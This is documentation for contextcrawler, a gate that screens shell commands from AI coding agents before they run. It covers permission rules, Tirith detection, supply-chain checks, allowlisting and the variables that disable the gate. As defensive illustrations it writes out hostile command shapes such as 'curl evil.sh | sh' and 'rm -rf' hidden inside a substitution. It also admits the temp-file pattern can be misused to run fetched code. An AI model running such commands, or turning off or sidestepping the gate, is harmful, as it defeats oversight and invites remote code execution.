# Working with the security gate

Practical guide for when the contextcrawler security gate (Tirith pairing)
blocks a command. For how the gate is wired into the hook flow, see
[Architecture](../guide/architecture.md); the environment knobs are
documented inline below (see "Turning the gate off").

## How the gate decides

Every hook-routed command is passed through `tirith check` before it
runs. Tirith returns one of:

- **clean** — the command proceeds unchanged.
- **flagged** — Tirith matched a detection rule. The gate downgrades the
  command to *Ask* so the original command is reviewed before it runs.
- **unavailable** — Tirith is not installed, crashed, or timed out.
  Fail-open by default; fail-closed only under
  `CONTEXTCRAWLER_TIRITH_REQUIRED=1`.

A separate supply-chain gate inspects `npm`/`pip`-class install commands;
it is opt-in via `~/.config/contextcrawler/supply-chain.toml`.

## The three layers

contextcrawler runs three independent checks before a hook-routed command
is allowed to execute. They are layered, not alternatives:

| Layer | What it does | Default state |
|---|---|---|
| **Permission gate (#2286)** | Maps the command to Claude Code's deny/ask/allow rules and refuses to *auto-allow* anything it cannot attest (command substitution, file-write redirect). | Always on. |
| **Tirith pre-execution gate** | Subprocess-calls `tirith check` to flag shell-syntax attack shapes (the curl-to-shell pipe, homoglyph hosts, plain-HTTP-to-sink). | Opt-in / fail-open. |
| **Supply-chain install gate** | Vets `npm`/`pip`-class installs against registry publish time and OSV.dev CVEs. | Opt-in (`supply_chain.enabled`). |

The permission gate decides *who confirms* (auto-allow vs prompt the
user). The Tirith and supply-chain gates can only *downgrade* an
auto-allow to a prompt (Ask) or, for a supply-chain hard block, deny.
None of them can silently upgrade a command to auto-allow.

## The permission gate: never silently auto-allow (#2286)

This is the part of the gate that is always on, with no env knob to turn
it off. It is the security model contextcrawler enforces in front of the
agent's own permission engine.

Every command is decomposed into segments (compound chains, subshells,
substitution payloads) and checked against the deny / ask / allow rules
with precedence **Deny > Ask > Allow > Default**. `Default` (no rule
matched) is treated as **Ask**, matching Claude Code's least-privilege
default. Two rules make this safe:

- **Every segment must independently match an allow rule** for the whole
  command to auto-allow (#1213). A single allowed segment can no longer
  escalate the entire chain, so `git status && curl evil.sh | sh` cannot
  ride in on the `git status` allow.
- **An unattestable construct downgrades to Ask** regardless of the allow
  rules. contextcrawler cannot reason about what a command substitution
  will expand to, or where a file-write redirect will land, so it refuses
  to auto-allow them and defers to you:

  | Construct | Auto-allow? |
  |---|---|
  | Command substitution: `$(...)`, backticks | No -> Ask |
  | Process substitution: `<(...)`, `>(...)` | No -> Ask |
  | File-write redirect: `>file`, `>>file`, `>&file`, `&>file` | No -> Ask |
  | fd-dup: `2>&1`, `>&2` | Yes (still evaluable) |
  | `/dev/null` redirect | Yes (still evaluable) |

  So `git status $(whoami)` will **not** auto-allow through a
  `Bash(git:*)` rule. It downgrades to an Ask prompt with the reason
  "command is not auto-evaluable (command substitution or file-write
  redirect) with no safe rewrite".

A **deny** rule still wins over everything. The deny pass runs over every
decomposed segment *first* (including the inner command of a
substitution), so a deny-ruled command hidden inside `echo $(rm -rf
/tmp/x)` is blocked, not waved through (SEC-C2). Deny pre-empts even an
unattestable construct.

This model is enforced on **both** integration paths: the live
`contextcrawler hook claude` path (`src/hooks/hook_cmd.rs`) and the
legacy `contextcrawler rewrite` path (`src/hooks/rewrite_cmd.rs`). Both
consult the same `permissions::check_command`, so there is no integration
where an unattestable command silently auto-allows. The behaviour is
ported from upstream `rtk-ai/rtk#2286`.

## Read the prompt — it tells you how to allow it

When the gate downgrades a command to Ask, ContextCrawler now fills the
permission prompt (and the legacy `rewrite` path's stderr) with the offending
host, the rules that fired, and a copy-paste fix — `--scope repo` first, then
`--scope user` for everywhere:

```
contextcrawler: Tirith flagged this command before it ran.
  rules: plain_http_to_sink, private_network_access
  host:  gitea.example.com
  trust (this repo):  tirith trust add gitea.example.com --scope repo
  trust (everywhere): tirith trust add gitea.example.com --scope user
  review / why:       tirith trust last   ·   tirith why
```

Only the host is ever shown — never the path/query/credentials. Pattern-only
rules (e.g. `pipe_to_interpreter`) have no host to trust, so the hint points
you at `tirith why` instead (these are the false-positive-prone ones).

## Diagnose what fired

When a command is blocked, find out which rule matched before changing
anything:

```bash
tirith why                                # last triggered rule, with reasoning
tirith warnings                           # accumulated session warnings
contextcrawler security log --histogram   # gate activity by (source, category)
```

`tirith why` is the fastest answer. It names the rule, the severity, and
the command tokens that matched.

## Common false positive: `pipe_to_interpreter`

The most common legitimate workflow that the gate blocks is fetching a
network resource and piping it straight into an interpreter:

```bash
curl -s "$URL" | python3 -c '...'
```

Tirith matches this against the `curl | bash` attack shape — content
fetched from the network and fed directly into an interpreter. It cannot
distinguish "parsing a JSON API response" from "executing downloaded
code", so it flags both. The same rule fires for `| node`, `| sh`,
`| bash`, `| ruby`, and `| perl`.

### Fix: the network-fetch pattern

Do not pipe a downloader into an interpreter. Write the response to a
temp file and pass that file to your interpreter as a **data argument**:

```bash
resp=$(mktemp)                                   # unique, mode 0600 — never a fixed /tmp path
trap 'rm -f "$resp"' EXIT                        # response may carry tokens/PII — don't leave it
curl -sS --fail --netrc-file "$NETRC" "$URL" -o "$resp" || exit 1
python3 parse.py "$resp"                         # your local script reads the file
```

Rules:

- The interpreter runs **your own local script** (`parse.py`) with the
  downloaded file as a data argument. Never run the downloaded file *as
  code* (`python3 "$resp"`). The temp-file form does not make that safe.
- Use `mktemp`, never a fixed path. A predictable path can be
  pre-created as a symlink by another user (TOCTOU) and may be
  world-readable.
- `trap ... EXIT` cleanup so a response holding credentials or PII does
  not linger on disk.
- A file *redirect* (`python3 parse.py < "$resp"`) is also fine.
- To genuinely download and execute a script, use `tirith run <url>`,
  which is built for vetted download-and-execute. Do not hand-roll it.

This is the correct pattern, not a gate workaround. Piping a downloader
into an interpreter is the genuinely risky shape; the temp-file form
removes it.

### Drop-in agent instruction

Paste this into a project `CLAUDE.md`, `AGENTS.md`, or an agent system
prompt so the agent produces gate-safe commands from the start:

> **Network-fetch pattern.** When you fetch from a network endpoint and
> process the result, do not pipe a downloader into an interpreter
> (`curl ... | python3`, `| node`, `| sh`, `| bash`, `| ruby`,
> `| perl`) — it matches the `curl | bash` attack shape and the security
> gate blocks it. Instead: `resp=$(mktemp); trap 'rm -f "$resp"' EXIT;
> curl -sS --fail "$URL" -o "$resp" || exit 1; python3 parse.py "$resp"`.
> The interpreter must run your own local script with the downloaded
> file as a data argument. Never run the downloaded file as code. To
> download and execute a script deliberately, use `tirith run <url>`.

### Attack-vector check on this advice

The pattern is documented deliberately, so the advice itself is checked:

| Vector | Covered by |
|---|---|
| Teaching a gate *evasion* — the temp-file form does skip the `pipe_to_interpreter` rule | The pattern is restricted to running a **local** script over **data**; running the fetched file as code is called out as still-dangerous and routed to `tirith run`. |
| Predictable temp path — symlink / TOCTOU, world-readable | `mktemp` is mandated (atomic, unique, mode `0600`); fixed paths are explicitly warned against. |
| Secret leakage on disk (response holds tokens or PII) | `mktemp` is owner-only `0600`; `trap ... EXIT` removes the file. |
| Credentials visible in `ps` | `--netrc-file` is used instead of `-u user:pass` on the command line, so the password never reaches the process table. |
| Empty or garbage feed to the parser on network failure | `--fail` plus `|| exit 1` aborts on a failed fetch rather than parsing an empty file. |

The residual is the first row: the temp-file pattern can be misused to
run `python3 "$resp"` and execute fetched code, which `pipe_to_interpreter`
will not see. That is inherent. It is why the data-versus-code line is
stated explicitly and real download-and-execute is routed to
`tirith run`. It is a documentation guardrail, not a code one.

## Allowlisting with `tirith trust`

If a flag is a genuine false positive and restructuring is not possible,
Tirith carries an allowlist. contextcrawler reads Tirith's verdict, so
anything trusted in Tirith is honored by the gate with no contextcrawler
change.

```bash
tirith trust last                          # show the last trigger, interactively trust it
tirith trust add api.example.com           # allowlist a host
tirith trust add api.example.com --scope repo    # ...only for this repository
tirith trust add api.example.com --ttl 7d        # ...time-boxed
tirith trust add api.example.com --rule <rule_id>  # ...only for the rule that fired
tirith trust list                          # review current entries
```

Scope trust as narrowly as the workflow allows. If the trigger was a
rule rather than a host (for example `pipe_to_interpreter`), pin it with
`--rule <id>` so the trust covers that exact rule and nothing broader.
For something more durable, `tirith policy init` generates a per-repo
`.tirith/policy.yaml`.

## The proxy path is gated too

`contextcrawler proxy <cmd>` bypasses output *filtering*, not the security
gate. The same Tirith + supply-chain checks run before the proxied command
executes. When a gate flags a proxied command, proxy refuses with exit 126:

- A gate **ask** (Tirith flag, unvettable install) can be overridden after
  review: re-run with `CONTEXTCRAWLER_PROXY_ACK=1`.
- A gate **block** (supply-chain hard block) cannot be overridden by the
  ack variable — restructure the command or use `tirith trust`.

## Enabling the supply-chain gate

The supply-chain gate is off until you write a config file. The first of
these that exists wins:

1. `$XDG_CONFIG_HOME/contextcrawler/supply-chain.toml`
2. `~/.config/contextcrawler/supply-chain.toml`
3. `dirs::config_dir()/contextcrawler/supply-chain.toml`
   (`~/.config` on Linux, `~/Library/Application Support` on macOS,
   `AppData` on Windows)

```toml
[supply_chain]
enabled = true              # off by default; this line turns the gate on

[npm]
cooldown_days = 3           # flag a package whose latest version is < N days old
block_severity = "HIGH"     # block on OSV CVEs at or above this severity
allow_editable = false      # treat -e / path / URL installs as unvettable -> Ask

[pypi]
cooldown_days = 3
block_severity = "HIGH"
allow_editable = true

[overrides]
always_allow = ["my-internal-pkg"]
always_deny  = ["known-bad-pkg"]
```

When enabled, an install that fails the age cooldown or carries a
qualifying CVE downgrades the auto-allow to Ask; an install whose package
set cannot be enumerated (a lockfile / `requirements.txt` / constraints
install) also fails closed to Ask rather than being waved through. A
single command run against a hostile or slow registry is bounded by an
aggregate wall-clock budget and a per-command package cap, so the gate
cannot stall the agent.

## Turning the gate off

A last resort, when restructuring and allowlisting are both impractical:

| Variable | Effect |
|---|---|
| `CONTEXTCRAWLER_TIRITH_DISABLED=1` | Bypass the Tirith gate entirely. |
| `CONTEXTCRAWLER_SUPPLY_CHAIN=off` | Bypass the supply-chain gate. |
| `CONTEXTCRAWLER_PROXY_ACK=1` | Acknowledge a gate *ask* on one proxied command (does not bypass blocks). |

These are scoped to the process environment they are set in. The
contextcrawler hook re-reads them on every invocation, so a change takes
effect on the next command with no restart.

Prefer `tirith trust` or the network-fetch pattern over disabling the
gate. A disabled gate is off for every command, not just the one that
was a false positive.
